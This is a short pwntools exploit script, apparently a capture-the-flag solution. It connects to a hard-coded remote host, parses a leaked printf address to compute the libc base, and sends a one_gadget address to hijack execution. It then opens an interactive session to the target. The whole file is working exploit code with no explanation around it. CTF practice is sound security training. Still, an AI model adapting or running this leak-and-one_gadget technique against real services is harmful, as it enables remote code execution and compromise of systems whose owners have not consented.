#!/usr/bin/python3
from pwn import *
from sys import argv

elf = context.binary = ELF('./chal_patched')
context.log_level = "debug"
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('ld-linux-x86-64.so.2', checksec=False)

# io = process()
io = remote("34.170.146.252" ,39335)
# gdb.attach(io,gdbscript = '''
        #    break *main+256''')

io.recvuntil(b"@ ")
printf_leak = int(io.recvn(0xe),0x10)
libc.address = printf_leak-libc.sym.printf

log.critical(f"libc base :{hex(libc.address)}")
one_gadget = [0x583ec,0x583f3,0xef4ce,0xef52b]
magic  = 0xef527
# io.sendlineafter(b">",pack(libc.address+one_gadget[0]))
io.recvuntil(b"> ")
io.sendline(str(hex(libc.address+magic)))
# print(hex(libc.address+one_gadget[0]))



io.interactive()
